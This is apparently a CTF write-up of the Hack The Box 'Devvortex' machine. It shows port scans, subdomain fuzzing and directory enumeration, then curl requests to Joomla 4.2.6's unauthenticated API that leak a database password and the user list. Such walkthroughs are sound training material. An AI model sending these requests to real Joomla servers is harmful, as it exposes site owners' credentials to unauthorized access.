# Devvortex



```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.242 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-05 18:37 CET
Initiating SYN Stealth Scan at 18:37
Scanning 10.10.11.242 [65535 ports]
Discovered open port 80/tcp on 10.10.11.242
Discovered open port 22/tcp on 10.10.11.242
Completed SYN Stealth Scan at 18:37, 28.72s elapsed (65535 total ports)
Nmap scan report for 10.10.11.242
Host is up, received user-set (0.12s latency).
Scanned at 2025-02-05 18:37:08 CET for 28s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.83 seconds
           Raw packets sent: 77282 (3.400MB) | Rcvd: 77296 (3.092MB)
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.242
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```





```bash
❯ nmap -sCV -p22,80 10.10.11.242 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-05 18:41 CET
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevVortex
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   105.62 ms 10.10.16.1
2   105.55 ms devvortex.htb (10.10.11.242)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.07 seconds
```



```bash
❯ xsltproc targetedXML > index.html
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/imagen (320).png" alt=""><figcaption></figcaption></figure>



```bash
❯ catnp /etc/hosts | grep 10.10.11.242
10.10.11.242 devvortex.htb
```



```bash
❯ whatweb http://devvortex.htb/
http://devvortex.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@DevVortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], JQuery[3.4.1], Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]
```



<figure><img src="../../.gitbook/assets/imagen (321).png" alt=""><figcaption></figcaption></figure>



```bash
❯ dirsearch -u 'http://devvortex.htb' -i 200 -t 50 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/Devvortex/Devvortex/reports/http_devvortex.htb/_25-02-05_18-45-12.txt

Target: http://devvortex.htb/

[18:45:12] Starting: 
[18:45:21] 200 -    7KB - /about.html
[18:45:35] 200 -    9KB - /contact.html

Task Completed
```



```bash
❯ wfuzz --hh=154 -c --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.devvortex.htb" http://devvortex.htb 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devvortex.htb/
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                              
=====================================================================

000000821:   200        501 L    1581 W     23221 Ch    "dev"  
```



```bash
❯ catnp /etc/hosts | grep 10.10.11.242
10.10.11.242 devvortex.htb dev.devvortex.htb
```





<figure><img src="../../.gitbook/assets/imagen (322).png" alt=""><figcaption></figcaption></figure>

```bash
❯ dirsearch -u 'http://dev.devvortex.htb' -i 200 -t 50 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/Devvortex/Devvortex/reports/http_dev.devvortex.htb/_25-02-05_18-52-11.txt

Target: http://dev.devvortex.htb/

[18:52:11] Starting: 
[18:53:06] 200 -   31B  - /administrator/cache/
[18:53:06] 200 -   31B  - /administrator/logs/
[18:53:07] 200 -   12KB - /administrator/
[18:53:07] 200 -   12KB - /administrator/index.php
[18:53:33] 200 -   31B  - /cache/
[18:53:40] 200 -   31B  - /cli/
[18:53:43] 200 -   31B  - /components/
[18:53:48] 200 -    0B  - /configuration.php
[18:54:27] 200 -    7KB - /htaccess.txt
[18:54:30] 200 -   31B  - /images/
[18:54:32] 200 -   31B  - /includes/
[18:54:43] 200 -   31B  - /layouts/
[18:54:44] 200 -   31B  - /libraries/
[18:54:44] 200 -   18KB - /LICENSE.txt
[18:54:56] 200 -   31B  - /media/
[18:55:02] 200 -   31B  - /modules/
[18:55:28] 200 -   31B  - /plugins/
[18:55:36] 200 -    5KB - /README.txt
[18:55:41] 200 -  764B  - /robots.txt
[18:56:08] 200 -   31B  - /templates/
[18:56:08] 200 -   31B  - /templates/index.html
[18:56:09] 200 -    0B  - /templates/system/
[18:56:12] 200 -   31B  - /tmp/
[18:56:29] 200 -    3KB - /web.config.txt

Task Completed
```



<figure><img src="../../.gitbook/assets/imagen (323).png" alt=""><figcaption></figcaption></figure>



{% embed url="https://joomla.stackexchange.com/questions/7148/how-to-get-joomla-version-by-http" %}



```bash
❯ curl -s -X GET 'http://dev.devvortex.htb/administrator/manifests/files/joomla.xml' | grep '<version>'
	<version>4.2.6</version>
```



{% embed url="https://vulncheck.com/blog/joomla-for-rce" %}

```bash
❯ curl -s 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true' | jq
{
  "links": {
    "self": "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true",
    "next": "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20",
    "last": "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"
  },
  "data": [
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline_message": "This site is down for maintenance.<br>Please check back again soon.",
        "id": 224
      }
    },
...[snip]...
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "P4ntherg0t1n5r3c0n##",
        "id": 224
      }
    }
```



```bash
❯ curl -s -X GET 'http://dev.devvortex.htb/api/index.php/v1/users?public=true' | jq
{
  "links": {
    "self": "http://dev.devvortex.htb/api/index.php/v1/users?public=true"
  },
  "data": [
    {
      "type": "users",
      "id": "649",
      "attributes": {
        "id": 649,
        "name": "lewis",
        "username": "lewis",
        "email": "lewis@devvortex.htb",
        "block": 0,
        "sendEmail": 1,
        "registerDate": "2023-09-25 16:44:24",
        "lastvisitDate": "2023-10-29 16:18:50",
        "lastResetTime": null,
        "resetCount": 0,
        "group_count": 1,
        "group_names": "Super Users"
      }
    },
    {
      "type": "users",
      "id": "650",
      "attributes": {
        "id": 650,
        "name": "logan paul",
        "username": "logan",
        "email": "logan@devvortex.htb",
        "block": 0,
        "sendEmail": 0,
        "registerDate": "2023-09-26 19:15:42",
        "lastvisitDate": null,
        "lastResetTime": null,
        "resetCount": 0,
        "group_count": 1,
        "group_names": "Registered"
      }
    }
  ],
  "meta": {
    "total-pages": 1
  }
}

```





<figure><img src="../../.gitbook/assets/imagen (324).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (325).png" alt=""><figcaption></figcaption></figure>

















































